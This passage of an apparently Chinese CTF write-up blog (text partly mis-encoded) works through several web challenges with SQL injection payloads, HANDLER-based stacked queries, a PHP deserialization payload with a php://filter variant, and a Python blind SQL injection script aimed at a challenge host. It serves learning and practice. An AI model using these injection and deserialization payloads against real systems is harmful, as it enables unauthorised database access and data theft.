awk">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];<br><span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-regexp">//</span> echo <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>	die(<span class="hljs-string">&quot;do not hack me!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;<br>		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));<br>		<span class="hljs-keyword">exit</span>();<br>	&#125;<br>	<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-regexp">//</span> echo <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br>		<span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);<br>		<span class="hljs-regexp">//</span> print_r(<span class="hljs-variable">$arr</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>			<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;<br>				echo <span class="hljs-variable">$flag</span>;<br>			&#125;<br>			<span class="hljs-keyword">else</span>&#123;<br>				die(<span class="hljs-string">&quot;wrong pass!&quot;</span>);<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			die(<span class="hljs-string">&quot;wrong user!&quot;</span>);<br>		&#125;<br>	&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>è¾“å…¥ä¸‡èƒ½é’¥åŒ™1â€™ or 1&#x3D;1#æ˜¾ç¤ºdo not hack me ä¸ä¸Šé¢å¯¹åº”ï¼Œé™åˆ¶äº†or</p>
<p>æŠ“åŒ…<br><img src="/images/L64.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œæ˜¾ç¤ºwrong user!<br>æŒ¨ä¸ªè¯•è¯•1ï¼Œ2ï¼Œ3çš„ä½ç½®ï¼ŒæŠŠå®ƒä»¬æ”¹ä¸ºâ€™adminâ€™ï¼Œåœ¨2ä½ç½®æ—¶å›æ˜¾å‘ç”Ÿäº†æ”¹å˜<br><img src="/images/N7R0.png" srcset="/img/loading.gif" lazyload><br>wrong pass!<br>è·³è¿‡äº†userï¼Œé‚£ä¹ˆ3çš„ä½ç½®å°±æ˜¯passwordäº†<br>æ³¨æ„åˆ°ä¸Šé¢çš„ä»£ç ifä¸­æœ‰MD5ï¼Œä½¿ifæˆç«‹<br>è®¾å¯†ç ä¸ºabcï¼ŒMD5åŠ å¯†åä¸ºï¼š900150983cd24fb0d6963f7d28e17f72<br><img src="/images/Y276WNW.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>è¾“å…¥  <code>1&#39;;show tables;#</code><br><img src="/images/LG.png" srcset="/img/loading.gif" lazyload><br>æ ¹æ®å­—é¢æ„æ€ï¼Œflagåº”è¯¥åœ¨FlagHereé‡Œ<br>è¾“å…¥  <code>1&#39;;cat FlagHere</code><br>æ²¡æœ‰æ˜¾ç¤º</p>
<p>è”åˆæ³¨å…¥<br>è¾“å…¥  <code>1&#39;;select from FlagHere;#</code><br><img src="/images/IR6X2.png" srcset="/img/loading.gif" lazyload><br>æ˜¾ç¤ºäº†è¢«è¿‡æ»¤æ‰çš„å†…å®¹</p>
<p>å°è¯•åŒå†™ç»•è¿‡<br><code>1&#39;;sselectelect from FlagHere</code><br>ä¸é€šè¿‡</p>
<p>å°è¯•å¤§å°å†™ç»•è¿‡<br><code>1&#39;;sElECt from FlagHere;#</code><br>åŒæ ·ä¸é€šè¿‡</p>
<h4 id="handlerè¯­æ³•"><a href="#handlerè¯­æ³•" class="headerlink" title="handlerè¯­æ³•"></a>handlerè¯­æ³•</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">handler</span>è¯­å¥ï¼Œä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ã€‚<br><span class="hljs-keyword">handler</span>è¯­å¥å¹¶ä¸å…·å¤‡<span class="hljs-keyword">select</span>è¯­å¥ä¸­çš„æ‰€æœ‰åŠŸèƒ½ã€‚<br>mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°<span class="hljs-keyword">sql</span>æ ‡å‡†ä¸­ã€‚<br><span class="hljs-keyword">handler</span>è¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨<br></code></pre></td></tr></table></figure>

<ol>
<li>HANDLER tbl_name OPEN<br>æ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚</li>
<li>HANDLER tbl_name READ FIRST<br>è·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œï¼Œuiåä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚</li>
<li>HANDLER tbl_name CLOSE<br>å…³é—­æ‰“å¼€çš„å¥æŸ„</li>
<li>HANDLER tbl_name READ index_name&#x3D;value<br>é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚</li>
</ol>
<p>è¾“å…¥</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>&#x27;;handler FlagHere <span class="hljs-keyword">open</span>;handler FlagHere <span class="hljs-keyword">read</span> first;handler FlagHere <span class="hljs-keyword">close</span><span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure>

<p><img src="/images/Q560M.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸ</p>
<h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç»è¿‡åˆ†æï¼Œè¿™ä¸ªé¢˜ç›®éœ€è¦ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–ä¹‹åçš„ç±»å¯¹è±¡ï¼Œå¹¶ä¸”è¦ç»•è¿‡ä¸¤å±‚é˜²æŠ¤ï¼š</p>
<p><strong>ä¸¤ä¸ªé˜²æŠ¤</strong></p>
<p><strong>is_valid()</strong><br>è¦æ±‚æˆ‘ä»¬ä¼ å…¥çš„strçš„æ¯ä¸ªå­—æ¯çš„ascliå€¼åœ¨32å’Œ125ä¹‹é—´ã€‚å› ä¸ºprotectedå±æ€§åœ¨åºåˆ—åŒ–ä¹‹åä¼šå‡ºç°ä¸å¯è§å­—ç¬¦\00*\00,ä¸ç¬¦åˆä¸Šé¢çš„è¦æ±‚ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong>å› ä¸ºphp7.1ä»¥ä¸Šçš„ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥å¯ä»¥å°†å±æ€§æ”¹ä¸ºpublicï¼Œpublicå±æ€§åºåˆ—åŒ–ä¸ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦ã€‚</p>
<p><strong>destruct()é­”æœ¯æ–¹æ³•</strong><br>op&#x3D;&#x3D;&#x3D;â€2â€ï¼Œæ˜¯å¼ºæ¯”è¾ƒ</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">function __destruct() &#123;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            $<span class="hljs-keyword">this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;process();<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>è€Œåœ¨process()å‡½æ•°ä¸­ï¼Œop&#x3D;&#x3D;â€2â€æ˜¯å¼±æ¯”è¾ƒ</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function process() &#123;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            $res = $<span class="hljs-keyword">this</span>-&gt;read();<br>            $<span class="hljs-keyword">this</span>-&gt;output($res);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯ä»¥ä½¿ä¼ å…¥çš„opä¸ºæ•°å­—2ï¼Œä»è€Œä½¿ç¬¬ä¸€ä¸ªå¼ºæ¯”è¾ƒè¿”å›falseï¼Œè€Œä½¿ç¬¬äºŒä¸ªå¼±æ¯”è¾ƒè¿”å›true</p>
<p><strong>æœ¬åœ°è¿›è¡Œåºåˆ—åŒ–æ“ä½œ</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-comment">//å› ä¸ºdestruceå‡½æ•°ä¼šå°†contentæ”¹ä¸ºç©ºï¼Œæ‰€ä»¥contentçš„å€¼éšæ„ï¼ˆä½†æ˜¯è¦æ»¡è¶³is_valid()å‡½æ•°çš„è¦æ±‚ï¼‰</span><br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–ç»“æœï¼š<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code></p>
<p>payload:<code>?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code></p>
<p>æŸ¥çœ‹æºç æ‰¾åˆ°flag</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¼ªåè®®</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;2&quot;</span>;<br> <br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>ä½¿ç”¨è¿‡base64è§£ç å¾—åˆ°flag</p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>All You Want Is In Table â€˜flagâ€™ and the column is â€˜flagâ€™<br>ç¡®å®šè¡¨å’Œå­—æ®µ</p>
<p>éšä¾¿è¾“å…¥<br>æŸ¥è¯¢1ï¼Œ2ä¼šæœ‰å›æ˜¾ï¼Œå…¶å®ƒçš„ä¼šæ˜¾ç¤ºé”™è¯¯<br>id&#x3D;1 Hello, glzjin wants a girlfriend.<br>id&#x3D;2 Do you want to be my girlfriend?<br>è¾“å…¥if(true,1,2) è¿”å›Hello, glzjin wants a girlfriend.<br>è¾“å…¥if(false,1,2) è¿”å›Do you want to be my girlfriend?</p>
<p>å¯ä»¥ç”¨è¿™ç§æ–¹æ³•åˆ¤æ–­flagçš„å€¼<br>å†™ä¸€ä¸ªè„šæœ¬(è¦ç”¨åˆ°time.sleepï¼Œä»¥é˜²å‡ºç°429é”™è¯¯ï¼Œè¿™ä¸ªè„šæœ¬æœ‰ä¸ªå°é—®é¢˜å°±æ˜¯å®ƒä¸èƒ½åŒ¹é…<code>-</code>ï¼Œæ‰€ä»¥è¦åœ¨ç©ºç¼ºçš„åœ°æ–¹æŠŠ<code>-</code>è¡¥å¥½ï¼Œåœ¨æˆ‘çš„æœºå™¨ä¸­time.sleep()æœ€å¥½çš„è®¾ç½®ä¸º0.1-0.4ï¼Œå› ä¸ºåˆ°äº†åé¢ä»ç„¶ä¸ä¼šæ˜¾ç¤º<code>-</code>)<br><strong>429é”™è¯¯</strong>ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚è¿‡å¤šï¼Œè¶…å‡ºäº†æœåŠ¡å™¨çš„å¤„ç†èƒ½åŠ›æˆ–é™åˆ¶ã€‚ å®ƒæ˜¯ä¸€ç§ååº”é€Ÿç‡é™åˆ¶çš„çŠ¶æ€ç ï¼Œç”¨äºå‘ŠçŸ¥å®¢æˆ·ç«¯æš‚æ—¶æ— æ³•å¤„ç†è¯·æ±‚ã€‚ åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå½“æ”¶åˆ°429çŠ¶æ€ç æ—¶ï¼Œå®¢æˆ·ç«¯åº”è¯¥é‡‡å–æªæ–½å‡å°‘è¯·æ±‚é¢‘ç‡æˆ–ä¼˜åŒ–ä»£ç ï¼Œä»¥é™ä½æœåŠ¡å™¨çš„è´Ÿè½½ã€‚</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import time<br><br><span class="hljs-attribute">s</span>=requests.session()<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,60):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:<br>        <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://becd3bf4-4a7a-41db-af52-6bc45f25b20e.node4.buuoj.cn:81/index.php&quot;</span><br>        <span class="hljs-attribute">sqls</span>=<span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;</span>.format(i,j)<br>        #<span class="hljs-built_in">print</span>(i)<br>        #<span class="hljs-built_in">print</span>(sqls)<br>        data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sqls&#125;<br>        c = s.post(url,<span class="hljs-attribute">data</span>=data)<br>        #<span class="hljs-built_in">print</span>(c.text)<br>        time.sleep(1.0)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello&#x27;</span> <span class="hljs-keyword">in</span> c.text:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-built_in">print</span>(flag)<br>            break<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>


